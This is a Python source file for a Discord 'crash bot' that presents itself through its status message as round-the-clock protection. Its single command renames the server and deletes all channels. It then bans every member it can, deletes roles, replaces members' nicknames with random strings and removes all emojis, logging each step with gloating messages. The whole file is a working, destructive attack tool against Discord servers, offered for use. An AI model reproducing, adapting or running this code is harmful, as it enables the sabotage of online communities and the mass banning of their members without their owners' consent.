import discord, os, sys, random, string, requests
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init
os.system('clear')
init()

client = commands.Bot(command_prefix='$')

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('Защита 24/7'))
    print(f"""{Fore.RED}

          _____ _____ 
        / ____/ ____|
  _____| (___| (___  
 |______\___ \\___ \ 
        ____) |___) |
       |_____/_____/ 
                     

{Fore.RED} краш бот 0.1 Автор YT | Пустой пак HK#6666;)""")
#Translation: crash bot 0.1 Posted by YT | Empty pack HK # 6666

@client.command()
async def lol(ctx):
    await ctx.guild.edit(name="cautionCleared")
    print(f"{Fore.WHITE}> {Fore.RED}serverClearer )")
    print(f"{Fore.RED}> {Fore.WHITE}channelCleaner{Fore.WHITE}...")
    for channel in ctx.guild.channels:
        await channel.delete()
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Cleaned {channel}")
    print(f"{Fore.WHITE}> {Fore.RED}ClearEverything{Fore.WHITE}.")
    print(f"{Fore.WHITE}> {Fore.RED}Ban, Losers!{Fore.WHITE}...")
    ban = 0
    for member in ctx.guild.members:
        try:
            ban += 1
            await member.ban()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ban this{Fore.WHITE}: {member}")
        except:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Most Banned я:{ban} human{Fore.WHITE}.")
    print(f"{Fore.WHITE}> {Fore.RED}Now let's clean up the roles{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Deleted {role}")
        else:
            break
    print(f"{Fore.WHITE}> {Fore.RED}Cleaned{Fore.WHITE}.")
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]{member}, Let's play a game? Your mask {nickname}")
        except Exception as e:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}All are now anonymous{Fore.WHITE}.")
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Removed this tricky :)")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Error")
    print(f"{Fore.WHITE}> {Fore.RED}That's it, there are no more smileys...{Fore.WHITE}.")
    print(f"{Fore.WHITE}> {Fore.RED}The server is DIED{Fore.WHITE}.")

try:
    client.run('токен сюда')
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()
